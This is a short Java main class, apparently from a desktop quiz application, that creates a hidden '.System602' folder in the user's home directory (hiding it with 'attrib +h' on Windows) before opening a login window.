import java.io.IOException;
import javax.swing.JOptionPane;
import java.io.File;

public class Quiz {
    public static void main(final String[] args) throws IOException, InterruptedException {
        final String dsktpPath = System.getProperty("user.home");
        final boolean f1 = new File(String.valueOf(dsktpPath) + "/.System602").mkdir();
        String OS = null;
        OS = System.getProperty("os.name");
        if (OS.startsWith("Windows")) {
            try {
                final File src = new File(String.valueOf(dsktpPath) + "/.System602");
                final Process p = Runtime.getRuntime().exec("attrib +h " + src.getPath());
                p.waitFor();
            }
            catch (InterruptedException e) {
                e.printStackTrace();
                JOptionPane.showMessageDialog(null, "Error :" + e);
            }
        }
        new Login();
    }
}
